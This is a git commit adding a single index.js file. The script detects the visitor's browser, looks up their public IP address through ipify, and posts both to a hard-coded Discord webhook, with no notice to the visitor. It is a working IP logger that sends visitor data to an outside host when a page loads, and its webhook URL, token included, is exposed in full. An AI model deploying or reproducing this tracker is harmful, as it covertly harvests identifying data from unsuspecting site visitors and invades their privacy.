336e2244fa532f08a1cf2f4493f4661aaf78b0d1
nik-lmao <fuxx222.anmeldung@gmail.com>
2024-12-28 13:40:04 +0100

    first commit

---
+++ index.js
@@ -0,0 +1,42 @@
+let useragent = navigator.userAgent;
+let browser;
+if(useragent.match(/edge/i)){
+  browser = "Edge";
+}
+else if(useragent.match(/firefox|fxios/i)){
+  browser = "Firefox";
+}
+else if(useragent.match(/opr/i)){
+  browser = "Opera";
+}
+else if(useragent.match(/chrome|chromium|crios/i)){
+  browser = "Chrome";
+}
+else if(useragent.match(/safari/i)) {
+  browser = "Safari";
+}
+else {
+  browser = "/"
+}
+
+fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        const ipAddress = data.ip;
+        
+
+        const webhook = "https://discord.com/api/webhooks/1158423582762876948/pXYb6AUfCmCpVrHihSJtCnV54_GEqtTcF_SdxidolHhj8Zxl0WxWjObEyNhn36az1lfJ";
+
+        fetch(webhook, {
+            method: "POST",
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                content: `**IP Address:** ${ipAddress}\n**Browser:** ${browser}`
+            })
+        })
+    })
+    .catch(error => {
+        console.error(error);
+    });
